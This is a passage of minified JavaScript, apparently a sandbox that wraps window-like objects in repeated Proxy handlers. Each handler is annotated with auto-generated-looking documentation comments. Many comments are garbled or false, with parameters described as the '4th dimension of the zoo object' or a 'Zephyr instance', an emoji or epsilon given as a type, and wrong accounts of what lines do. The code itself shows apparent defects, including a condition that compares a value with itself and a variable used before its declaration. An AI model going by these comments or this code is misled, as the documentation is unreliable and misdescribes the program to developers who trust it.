                            delete zn[t],
                            o || r)
                        }
                        ,
                        /**
                         * @description is passed an object or value and returns its corresponding value,
                         * either directly if it is a simple value or indirectly through a getter method if
                         * it has one.
                         * 
                         * @param { variable. } e - object to be retreived from the `C` array, and its value
                         * is used to determine whether the object's `value` or `get` method should be called.
                         * 
                         * 		- `e`: The deserialized input object.
                         * 		- `t`: The key used to store the value in the `zn` map.
                         * 		- `o`: The stored value for `t`, which can be a primitive or an object.
                         * 		- `d`: A property of `C[t]`, which is a config object that contains information
                         * about the serialized input.
                         * 		- `r`: The deserialized object returned by the `get` method, if one exists.
                         * 		- `It`: An inner function used to extract the value of the `value` or `get`
                         * property of the input object.
                         * 		- `Gt`: A nested function used to extract the value of the bound property of the
                         * input object.
                         * 
                         * 
                         * @param { string } t - 0-based index of an object in the `zn` array, which contains
                         * objects with methods for retrieving values or getting the current value of a property.
                         * 
                         * @returns { : `o.value` or `o.get()` (if applicable). } a value or an object with
                         * a `get` method that returns a value.
                         * 
                         * 		- If `o.once` is `true`, the `get` function is called only once.
                         * 		- If `o.bind` is present, the function is bound to a specific context before
                         * being called.
                         * 		- The `value` property of `o` returns the result of calling `o.get()` directly.
                         * 		- If `r.d` is set to a truthy value (e.g., `"value"`), the `get` function returns
                         * the value of the specified property of `r`. Otherwise, it returns the result of
                         * calling `r.get()`.
                         */
                        get: (e,t)=>{
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = C[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        /**
                         * @description generates a descriptor object that includes a value, writable and
                         * enumerable flags for an object property based on the properties of an input object
                         * `C`. It also checks if the property is configurable or non-configurable and sets
                         * the appropriate value to the descriptor.
                         * 
                         * @param { object } e - value of an object property, which is used to assign a new
                         * value to the property when the `C` object's `t` property is changed.
                         * 
                         * @param { object } t - 2nd level of prototype chain for an object.
                         * 
                         * @returns { object } an object containing the desired property descriptor information.
                         */
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = C[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                    Gt(t)
                                }
                                ),
                                i && !i.configurable && vt(C, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in zn || t in C,
                        /**
                         * @description determines whether a given object has an own enumerable property key
                         * that corresponds to an own enumerable property value of its own in another object.
                         * It takes three arguments: an object `x`, a function `e`, and an optional argument
                         * `n`.
                         * 
                         * @returns { array } an array of unique strings representing the keys in the given
                         * object.
                         */
                        ownKeys: ()=>{
                            const e = e=>!(e in x)
                              , t = gt(x)
                              , n = Ft(gt(ht(zn)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(C, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        /**
                         * @description sets a value for an object property. If the property exists, it sets
                         * its value; otherwise, it creates a new object with the specified property and set
                         * its value to the given argument.
                         * 
                         * @param { ε (epsilon). } e - 4th dimension of the zoo object, which is an array of
                         * configuration objects, each containing a value and writable flag for that value.
                         * 
                         * 		- `zn`: a plain object that stores properties of interest (`t` property is present).
                         * 		- `o`: a property in the `zn` object, which stores a value. If the value exists
                         * and has a `set` method, then return `true`.
                         * 		- `d`: a property in the `C` object (a nested object), which stores an object
                         * with properties `writable`, `value`, and `configurable`.
                         * 
                         * 	The function performs various actions based on these properties:
                         * 
                         * 		- If the `d` property exists and is not configurable, then return `false`.
                         * 		- If the `d` property exists and is writable, but does not have a `set` method,
                         * then perform an action depending on the type of value in `d`.
                         * 		- If the `d` property does not exist or is not writable, then perform an action
                         * depending on the type of value in `C[t]`.
                         * 
                         * 	In summary, the function explains the properties of the input `e` and performs
                         * actions based on those properties.
                         * 
                         * 
                         * @param { object } t - 5th property of an object passed as the `zn` argument to the
                         * function, and is used to determine whether or not to update the object's value for
                         * a particular key based on its configurability and writability.
                         * 
                         * @param { number } n - value to be set in the object `o` or one of its properties,
                         * and is passed to the `set()` method to set the value.
                         * 
                         * @returns { `Undefined`. } a boolean value indicating whether the value was
                         * successfully set.
                         * 
                         * 		- `o`: The output of the `set` function is stored in the `o` variable, which is
                         * an object.
                         * 		- `d`: The `d` variable stores the value of the `configurable` property of the
                         * `C[t]` object.
                         * 		- `It(d, "set")`: This line checks whether the `set` method is writable for the
                         * `C[t]` object. If it is not writable, the function returns `!0`.
                         * 		- `i(t)`: This line checks whether the `t` variable is an array. If it is, the
                         * function returns `!0`.
                         * 		- `(delete zn[t], vt(C, t, n), ...)`: These lines remove the `zn` and `C` objects
                         * from their respective properties, and then update the `n` property of the `C`
                         * object to a new value. The `vt` function is called with the `t` and `n` arguments,
                         * which are used to create a new configuration object.
                         * 		- `(C[t] && C[t].configurable && C[t].writable && C[t].value && "function" ==
                         * typeof C[t].value && !p(C[t].value) ...)`: This line checks whether the `C[t]`
                         * object has a `configurable`, `writable`, and `value` property, and whether the
                         * value is a function. If it is, the function updates the `value` property to a new
                         * value using the `Gt` function.
                         * 		- `(C[t] && !C[t].configurable && "function" == typeof C[t].get && !p(C[t].get)
                         * ...)`: This line checks whether the `C[t]` object has a `configurable` property
                         * and whether the `get` method is a function. If it is, the function updates the
                         * `get` property to a new value using the `Gt` function.
                         * 		- `(C[t] && !C[t].configurable && "function" == typeof C[t].set && !p(C[t].set)
                         * ...)`: This line checks whether the `C[t]` object has a `configurable` property
                         * and whether the `set` method is a function. If it is, the function updates the
                         * `set` property to a new value using the `Gt` function.
                         */
                        set: (e,t,n)=>{
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = C[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                            vt(C, t, n),
                            C[t] && C[t].configurable && C[t].writable && C[t].value && "function" == typeof C[t].value && !p(C[t].value) && (C[t].value = Gt(C[t].value)),
                            C[t] && !C[t].configurable && "function" == typeof C[t].get && !p(C[t].get) && (C[t].get = Gt(C[t].get)),
                            C[t] && !C[t].configurable && "function" == typeof C[t].set && !p(C[t].set) && (C[t].set = Gt(C[t].set)),
                            0))
                        }
                    }));
                    Ht(gt(P), (e=>{
                        zn[e] = zn[e] || Gt({
                            bind: !0
                        })
                    }));
                    const L = Gt({})
                      , R = Gt({});
                    Lt(R, hn, "Window");
                    const k = new Un(R,Gt({
                        /**
                         * @description updates the property `t` on an object `o` with value `s`. It returns
                         * `true` if the property is defined and not configurable, false otherwise. If the
                         * property is already defined, it sets its value to `Gt(value)` if it's a function
                         * or primitive value, or updates its get/set methods if they are present. Finally,
                         * it removes the property from the `L` object if it exists.
                         * 
                         * @param { object } e - 3-arg callback function `i()` that is used to retrieve an
                         * object's enumerable and configurable properties, which are then used to determine
                         * if the object's values can be modified.
                         * 
                         * @param { object } t - object that contains the properties to be tested for
                         * configurability, enumerability, and writability.
                         * 
                         * @param { object } n - property or field to be processed in the provided object `i(t)`.
                         * 
                         * @returns { object } a new property on an object, created through a combination of
                         * settings and deletions.
                         */
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = i(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && L[t] || o && o.get && !o.set ? (vt(r ? R : L, t, s),
                            !1) : (vt(R, t, s),
                            R[t] && R[t].configurable && R[t].writable && R[t].value && "function" == typeof R[t].value && !p(R[t].value) && (R[t].value = Gt(R[t].value)),
                            R[t] && !R[t].configurable && "function" == typeof R[t].get && !p(R[t].get) && (R[t].get = Gt(R[t].get)),
                            R[t] && !R[t].configurable && "function" == typeof R[t].set && !p(R[t].set) && (R[t].set = Gt(R[t].set)),
                            delete L[t],
                            !0)
                        }
                        ,
                        /**
                         * @description removes a property from an object and all its nested objects, if the
                         * property is not configurable or not found in any other object.
                         * 
                         * @param { object } e - environment object used to determine if an property on an
                         * object can be deleted or not.
                         * 
                         * @param { object } t - name of an object property to check if it has been deleted,
                         * and if so, return `true`.
                         * 
                         * @returns { boolean } `true` if the property was deleted successfully, otherwise `false`.
                         */
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = R[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                            R[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete R[t]),
                            delete zn[t],
                            o || r)
                        }
                        ,
                        /**
                         * @description retrieves a value or callable associated with a key in an object,
                         * checking for possible getter methods and returning either the value or a bound
                         * version of the callable.
                         * 
                         * @param { variable. } e - 2nd argument passed to the `R` object's `get()` method,
                         * which is used to retrieve the value of the property specified in the `t` variable.
                         * 
                         * 		- If `e` is an object with a `once` property set to `true`, then `delete e[t]`
                         * and return `e.value`.
                         * 		- If `e` is an object with a `get` method, then call the method and return its
                         * result.
                         * 		- If `r` is an object with a property `d` (which is a string), then check if the
                         * value of `d` is "value". If it is, then call the `It` function with the value of
                         * `r` as argument, and return the resulting value. Otherwise, call the `It` function
                         * with the value of `r` and the string "get" as arguments, and return the resulting
                         * value.
                         * 		- The `Gt` function is not explained in the given code snippet, but it likely
                         * performs some kind of conversion or transformation on the input value.
                         * 
                         * 
                         * @param { object } t - key of an object in the `zn` array or the name of a property
                         * 
                         * @returns { `value`. } the value or a reference to the object property that matches
                         * the given key, if it exists.
                         * 
                         * 		- `if (o.once && delete zn[t], "value" in o)` - If the `o` object has the property
                         * `once` and its value is `true`, and if the variable `zn[t]` exists and is deleted,
                         * then the `value` property of `o` is returned.
                         * 		- `if (o.get)` - If the `o` object has a `get` property, its value is returned.
                         * 		- `let e; const o = "value" in r ? It(r, "value") : (e = It(r, "get")) &&
                         * "function" == typeof e ? e() : void 0;` - If the `r` object has a `value` property,
                         * its value is returned. Otherwise, an attempt is made to retrieve the value of the
                         * `r` object's `get` property using the `It()` function. If the `get` property is a
                         * function, its value is returned by calling it. otherwise, the value is set to `void
                         * 0`.
                         * 		- `return o && o.once && o.bind ? Gt(o)` - If the `o` object has the properties
                         * `once` and `bind`, and if `Gt(o)` is defined, its value is returned. Otherwise,
                         * the `o` object's value is returned.
                         */
                        get: (e,t)=>{
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = R[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        /**
                         * @description takes a given object `o` and returns an object containing the properties
                         * of the object, along with their respective enumerable, configurable, writable, and
                         * value attributes. If the property does not exist in the original object, it is
                         * created with default attributes.
                         * 
                         * @param { object } e - Optional Property Assigner object, which is used to assign
                         * properties to the target object `o`.
                         * 
                         * @param { `unknown` value. } t - etheral value that will be used to update the
                         * enumerable, configurable, writable, and value properties of an object when the
                         * `Gt()` method is called.
                         * 
                         * 		- `d`: A reference to an object `o`, which may contain configuration options for
                         * the function.
                         * 		- `l`: A reference to a string `r`, which contains the original value of `t`.
                         * 		- `Gt`: An alias for the `get` method, which is used to retrieve the current
                         * value of `t`.
                         * 		- `enumerable`: A boolean flag indicating whether `t` can be enumerated.
                         * 		- `configurable`: Another boolean flag indicating whether `t` can be reassigned.
                         * 		- `writable`: A boolean flag indicating whether `t` can be modified.
                         * 		- `value`: The current value of `t`.
                         * 		- `set`: An optional method that can be used to update the value of `t`.
                         * 		- `get`: An optional method that can be used to retrieve the current value of `t`.
                         * 
                         * 
                         * @returns { object } an object representing the property descriptor for a given
                         * property name on an object.
                         */
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = R[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                    Gt(t)
                                }
                                ),
                                i && !i.configurable && vt(R, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in zn || t in R,
                        /**
                         * @description generates a set of unique integers that are not present in an object's
                         * keys. It iterates over the object's keys and sets each key to false if it is not
                         * present in the object. The function then returns an array of these falsy values.
                         * 
                         * @returns { integer } an array of integers indicating the presence or absence of
                         * objects in the provided array.
                         */
                        ownKeys: ()=>{
                            const e = e=>!(e in L)
                              , t = gt(L)
                              , n = Ft(gt(ht(zn)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(R, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        /**
                         * @description sets a property on an object based on a string or symbol value. If
                         * the property is not found, it creates a new object and assigns it the provided value.
                         * 
                         * @param { number } e - 5th argument passed to the `zn` method, which is used to
                         * store the result of the `set` operation.
                         * 
                         * @param { unknown value. } t - name of an object property to be accessed or modified.
                         * 
                         * 		- `o`: A object that contains the setter function for the property `n`.
                         * 		- `d`: The getter function for the property `n`.
                         * 		- `It`: A flag indicating whether the property `n` is writable or not.
                         * 		- `p`: A flag indicating whether the property `n` is observable or not.
                         * 
                         * 	The function checks if the property `n` has a setter function and if it is writable
                         * and observable, and then assigns the result of calling the setter function to the
                         * property `n`. If any of these conditions are not met, the function returns `false`.
                         * 
                         * 
                         * @param { object } n - value that is being set or gotten for the property of the
                         * object in the `R` array.
                         * 
                         * @returns { boolean } an empty truthy value `!0`, indicating that the setting was
                         * successful.
                         */
                        set: (e,t,n)=>{
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = R[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                            vt(R, t, n),
                            R[t] && R[t].configurable && R[t].writable && R[t].value && "function" == typeof R[t].value && !p(R[t].value) && (R[t].value = Gt(R[t].value)),
                            R[t] && !R[t].configurable && "function" == typeof R[t].get && !p(R[t].get) && (R[t].get = Gt(R[t].get)),
                            R[t] && !R[t].configurable && "function" == typeof R[t].set && !p(R[t].set) && (R[t].set = Gt(R[t].set)),
                            0))
                        }
                    }));
                    Ht(gt(k), (e=>{
                        zn[e] = zn[e] || Gt({
                            bind: !0
                        })
                    }));
                    const A = Gt({})
                      , M = Gt({});
                    Lt(M, hn, "Window");
                    const j = new Un(M,Gt({
                        /**
                         * @description modifies an object's property, checking for configurable and enumerable
                         * values, and setting getters and setters when necessary.
                         * 
                         * @param { object } e - object to be checked for configuration and enumerability,
                         * and is used to determine whether the object's properties can be modified or not.
                         * 
                         * @param { object } t - property being checked for configurability, enumerability,
                         * and writability.
                         * 
                         * @param { string } n - object to be updated, which is passed through to the `Gt()`
                         * function for update.
                         * 
                         * @returns { boolean } a boolean indicating whether the property was successfully defined.
                         */
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = i(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && A[t] || o && o.get && !o.set ? (vt(r ? M : A, t, s),
                            !1) : (vt(M, t, s),
                            M[t] && M[t].configurable && M[t].writable && M[t].value && "function" == typeof M[t].value && !p(M[t].value) && (M[t].value = Gt(M[t].value)),
                            M[t] && !M[t].configurable && "function" == typeof M[t].get && !p(M[t].get) && (M[t].get = Gt(M[t].get)),
                            M[t] && !M[t].configurable && "function" == typeof M[t].set && !p(M[t].set) && (M[t].set = Gt(M[t].set)),
                            delete A[t],
                            !0)
                        }
                        ,
                        /**
                         * @description removes a property from an object and its dependencies if the property
                         * is not configurable or the object does not exist.
                         * 
                         * @param { object } e - environment object that contains references to global objects,
                         * and it is used to check if a property in the object can be deleted or not.
                         * 
                         * @param { object } t - property or method to check for configurability.
                         * 
                         * @returns { boolean } true if the specified property exists and can be deleted, and
                         * false otherwise.
                         */
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = M[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                            M[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete M[t]),
                            delete zn[t],
                            o || r)
                        }
                        ,
                        /**
                         * @description retrieves and returns values from the nested object `zn` or the object
                         * within the outer object `M`.
                         * 
                         * @param { object } e - result of calling the `get()` or `value()` method on an
                         * object, and it is used to return the value of the object if it has one, or the
                         * result of calling the method if it is a function.
                         * 
                         * @param { undefined/value. } t - property or method that the function is trying to
                         * access or call.
                         * 
                         * 		- `zn[t]:` is an object that contains the value of `t`. If `t` has the `once`
                         * property set to `true`, the object is deleted after being returned.
                         * 		- `o.get: ` indicates whether `o` has a `get()` method, which returns a value
                         * when called.
                         * 		- `o.value: ` represents the value of the object `o`.
                         * 		- `o.once: ` indicates whether `o` has the `once` property set to `true`, meaning
                         * that the object should be deleted after use.
                         * 		- `r`: is an object that contains a property named `d` (short for "descriptor")
                         * with a value representing the result of calling `M[t]`. If this property exists,
                         * it indicates that the value of `t` has been modified by an interceptor and must
                         * be accessed through the interceptor.
                         * 		- `e`: is an optional variable used to store the return value of calling `It(r,
                         * "get")`, which can be a function or a value depending on whether `r` has a `get()`
                         * method. If `e` is present, it must be called with no arguments to retrieve the
                         * modified value of `t`.
                         * 		- `Gt(o):` is an optional value that represents the final result of calling
                         * `It(o)`. If this value exists, it indicates that `o` has been intercepted and its
                         * value should be used in place of the original value of `t`.
                         * 
                         * 
                         * @returns { `value`, or alternatively, if present and applicable, an instance of a
                         * `function`. } the value of the object, if it exists, or a function that returns
                         * the value when called.
                         * 
                         * 		- `value`: If `t` is an object with a `value` property, the value of that property
                         * is returned.
                         * 		- `get`: If `t` is an object with a `get` method, the result of calling the `get`
                         * method is returned. The `get` method must be a function.
                         * 		- `bind`: If `t` is an object with a `bind` method, the result of calling the
                         * `bind` method is returned. The `bind` method must be a function.
                         * 
                         * 	The output of the `get` function may also have other properties and attributes
                         * depending on its type and usage.
                         */
                        get: (e,t)=>{
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                "value" in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = M[t];
                            if (r) {
                                let e;
                                const o = "value" in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        /**
                         * @description takes an object and a property name as input, and returns the descriptor
                         * for the property if it exists on the object, or returns a new descriptor with set,
                         * get, enumerable, and configurable properties modified to reflect the property's visibility.
                         * 
                         * @param { object } e - accessor for the property being set orGet in the function.
                         * 
                         * @param { integer } t - token that is being processed in the function, and it is
                         * used to access the token's metadata from the `M` object.
                         * 
                         * @returns { object } an object that contains the property descriptors for a given
                         * property name.
                         */
                        getOwnPropertyDescriptor: (e, t) => {
                            let { d: o, l: r } = M[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                    r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = () => {
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                        Gt(t)
                                }
                                ),
                                    i && !i.configurable && vt(M, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e, t) => t in zn || t in M,
                        /**
                         * @description takes an object `A` and returns an array of its own enumerable property
                         * keys. It first checks if an element is not in the object, then checks the type of
                         * the object and does the same thing again recursively until reaching a leaf node.
                         * 
                         * @returns { integer } an array of unique string values, where each value represents
                         * a property name in the provided object.
                         */
                        ownKeys: () => {
                            const e = e => !(e in A)
                                , t = gt(A)
                                , n = Ft(gt(ht(zn)), e)
                                , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(M, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: () => !0,
                        /**
                         * @description sets a property value of an object if it is not null, undefined, or
                         * non-writable, and returns true if successful.
                         * 
                         * @param { unknown type due to lack of context. } e - Zephyr instance, providing
                         * access to its properties and methods.
                         * 
                         * 		- `t`: A string property that represents the type of the input.
                         * 		- `n`: An integer property that represents the number value associated with the
                         * input.
                         * 		- `zn`: An object property that stores the original serialized input.
                         * 		- `M`: An object property that stores the JSON object containing metadata for
                         * the deserialized input.
                         * 		- `d`: A string property that represents the deserialized data value of type JSON.
                         * 
                         * 	The function performs operations on the deserialized input based on its properties
                         * and attributes.
                         * 
                         * 
                         * @param { string } t - name of a property or method that is part of an object or
                         * its prototype chain, and the function returns whether it can be modified or not
                         * based on the object's configurable and writable properties.
                         * 
                         * @param { (variable) } n - name of a property or method that is being called on an
                         * object, and its value determines whether the call is successful.
                         * 
                         * 		- If `o` is a valid object, the `set` function returns `!0` if the property can
                         * be set, and `0` otherwise.
                         * 		- The `{ d }` property of the object contains the value of the property in the
                         * deserialized input `M`.
                         * 		- If the property is writable (`!d.writable`) or the value is a function (`function`
                         * == typeof M[t].value), the `set` function does nothing and returns `!0`.
                         * 		- If the property is not writable, the `set` function tries to assign a new value
                         * to the property using the getter function (`Gt()`) if available. If no getter
                         * function is available or the value cannot be set, the function returns `0`.
                         * 
                         * 
                         * @returns { object } a boolean value indicating whether the property was successfully
                         * set.
                         */
                        set: (e, t, n) => {
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                    !0;
                            const { d } = M[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                                vt(M, t, n),
                                M[t] && M[t].configurable && M[t].writable && M[t].value && "function" == typeof M[t].value && !p(M[t].value) && (M[t].value = Gt(M[t].value)),
                                M[t] && !M[t].configurable && "function" == typeof M[t].get && !p(M[t].get) && (M[t].get = Gt(M[t].get)),
                                M[t] && !M[t].configurable && "function" == typeof M[t].set && !p(M[t].set) && (M[t].set = Gt(M[t].set)),
                                0))
                        }
                    }));
                    Ht(gt(j), (e => {
                        zn[e] = zn[e] || Gt({
                            bind: !0
                        })
                    }));
                    const N = Gt({})
                        , D = Gt({});
                    Lt(D, hn, "Window");
                    const F = new Un(D, Gt({
                        /**
                         * @description creates a new property on an object or overrides an existing one's
                         * attributes, configuring its writable and value capabilities while setting or
                         * clearing a getter and setter for the property.
                         * 
                         * @param { enumeration/duck-type. } e - Object value that is being processed, and
                         * it is used to determine whether the value can be modified or not.
                         * 
                         * 		- `d`: The descriptor object `o`, which may have the configurable and enumerable
                         * properties set to values other than their default values.
                         * 		- `l`: The local name of the property, which is `r` in this case.
                         * 		- `s`: The getter or setter function for the property, which is `Gt()` in this
                         * case.
                         * 
                         * 	The return value is determined by evaluating the following conditions:
                         * 
                         * 		- If `o && !o.configurable && (!!o.configurable !=!!!s.configurable || !!o.enumerable
                         * != !!o.enumerable)`, then the property is not configurable or enumerable, and the
                         * function returns `!1`.
                         * 		- Otherwise, the function returns `(vt(r ? D : N, t, s), !1)`. Here, `r` is the
                         * property value, `D` is the descriptor object, `N` is the name of the property, and
                         * `t` is the name of the object.
                         * 		- If `D[t] && D[t].configurable && D[t].writable && D[t].value && "function" ==
                         * typeof D[t].value && !p(D[t].value) && (D[t].value = Gt(D[t].value))`, then the
                         * property is configurable and writable, and its value can be transformed. The
                         * function sets the value to the result of calling `Gt()` on the value.
                         * 		- If `D[t] && !D[t].configurable && "function" == typeof D[t].get && !p(D[t].get)
                         * && (D[t].get = Gt(D[t].get))`, then the property is not configurable, but its
                         * getter function can be transformed. The function sets the getter function to the
                         * result of calling `Gt()` on the getter function.
                         * 		- If `D[t] && !D[t].configurable && "function" == typeof D[t].set && !p(D[t].set)
                         * && (D[t].set = Gt(D[t].set))`, then the property is not configurable, but its
                         * setter function can be transformed. The function sets the setter function to the
                         * result of calling `Gt()` on the setter function.
                         * 		- If `delete N[t]`, then the property is no longer present in the object.
                         * 		- Finally, if `!0`, then the function returns `!1`.
                         * 
                         * 
                         * @param { object } t - object being processed, which is passed through several
                         * methods to determine its configuration and value.
                         * 
                         * @param { object } n - object to be normalized, which is passed through the `Gt()`
                         * method to transform it into a normalized form.
                         * 
                         * @returns { object } a Boolean indicating whether a property has been successfully
                         * defined or modified.
                         */
                        defineProperty: (e, t, n) => {
                            const { d: o, l: r } = i(t)
                                , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && N[t] || o && o.get && !o.set ? (vt(r ? D : N, t, s),
                                !1) : (vt(D, t, s),
                                D[t] && D[t].configurable && D[t].writable && D[t].value && "function" == typeof D[t].value && !p(D[t].value) && (D[t].value = Gt(D[t].value)),
                                D[t] && !D[t].configurable && "function" == typeof D[t].get && !p(D[t].get) && (D[t].get = Gt(D[t].get)),
                                D[t] && !D[t].configurable && "function" == typeof D[t].set && !p(D[t].set) && (D[t].set = Gt(D[t].set)),
                                delete N[t],
                                !0)
                        }
                        ,
                        /**
                         * @description checks if a property exists on an object and then removes it from the
                         * object and the prototype chain, including any nested objects. If the property is
                         * not configurable, it also deletes it from the original object's value.
                         * 
                         * @param { variable. } e - environment in which the code is executed and is used to
                         * determine whether or not a variable is configurable.
                         * 
                         * 		- `d`: A number property called `n`.
                         * 		- `l`: An object property called `o`.
                         * 		- `w`: An object property called `r`.
                         * 
                         * 
                         * @param { boolean } t - 3rd component of an object, referred to as `D`, and is used
                         * to determine whether the object's property named by `t` should be deleted or not.
                         * 
                         * @returns { boolean } a boolean value indicating whether a property can be deleted.
                         */
                        deleteProperty: (e, t) => {
                            let { d: n, l: o, w: r } = D[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                                D[t] && "function" == typeof n && r && i(t, n)),
                                (r || (n = e[t]) && n.configurable) && (delete e[t],
                                    delete D[t]),
                                delete zn[t],
                                o || r)
                        }
                        ,
                        /**
                         * @description retrieves a value or invokes an operation based on property types and
                         * definitions stored in an object (`zn`).
                         * 
                         * @param { (type inference) value of the expression provided. } e - result of calling
                         * the `get()` method on an object referenced by `o`, which is passed as a parameter
                         * to the function.
                         * 
                         * 		- `once`: If present, indicates that the value of `e` is a single invocation of
                         * an async function and must not be called more than once.
                         * 		- `bind`: If present, specifies that `e` is a bound function and should only be
                         * called with arguments specified in the `bind` call.
                         * 
                         * 
                         * @param { unknown or unspecified value because there is no explicit indication of
                         * its data type within the provided code snippet. } t - property or method name being
                         * accessed or called on the object passed to the function, which is then returned
                         * based on its value and type.
                         * 
                         * 		- `o`: If `t` has an property `o`, it is returned as `o`.
                         * 		- `once`: If `t` has a property `once`, and `delete zn[t]` is executed, the
                         * property `value` is accessed if it exists.
                         * 		- `get`: If `t` has a method `get`, it returns the result of calling the method.
                         * 		- `d`: If `t` has a property `d` with a value of type `Object`, its properties
                         * are deserialized using `It`. If any property of `d` is not serializable, an error
                         * is thrown.
                         * 		- `r`: If `t` has a property `r`, it is deserialized using `It`. The resulting
                         * object has the following properties:
                         * 		+ `value`: If `r` has a property `value`, it is returned as `value`.
                         * 		+ `get`: If `r` has a method `get`, it is called and the result is returned.
                         * 
                         * 	In summary, the `get` function determines the type of input `t` and returns an
                         * object based on its properties and methods.
                         * 
                         * 
                         * @returns { object } the value of the object or a bound version of it, depending
                         * on its `once` and `bind` properties.
                         */
                        get: (e, t) => {
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                    "value" in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const { d: r } = D[t];
                            if (r) {
                                let e;
                                const o = "value" in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        /**
                         * @description 1) retrieves or creates an object's descriptor for a property, 2)
                         * sets the value, configurable, enumerable, and writable properties of the descriptor,
                         * 3) returns the descriptor.
                         * 
                         * @param { object } e - context object that contains the `get`, `set`, and `value`
                         * properties of the property being evaluated, which are then used to initialize the
                         * returned object.
                         * 
                         * @param { "enumerable" and "value". } t - 🤝 property descriptor for an object,
                         * which is used to define and manipulate its value.
                         * 
                         * 		- `d`: A descriptor object containing enumerable, configurable, writable, and
                         * value properties.
                         * 		- `l`: The get property of the descriptor object, which is a function that returns
                         * the value of the property.
                         * 		- `o`: An optional enumerator that can be used to access the property values in
                         * the correct order.
                         * 		- `r`: A boolean indicating whether the property is redefinable or not.
                         * 
                         * 	The function then proceeds to destructure `t` if appropriate and perform various
                         * operations on its properties, such as setting the value of the `get` property and
                         * redefinining the property's configurability.
                         * 
                         * 
                         * @returns { object } an object containing information about a property on an object.
                         */
                        getOwnPropertyDescriptor: (e, t) => {
                            let { d: o, l: r } = D[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
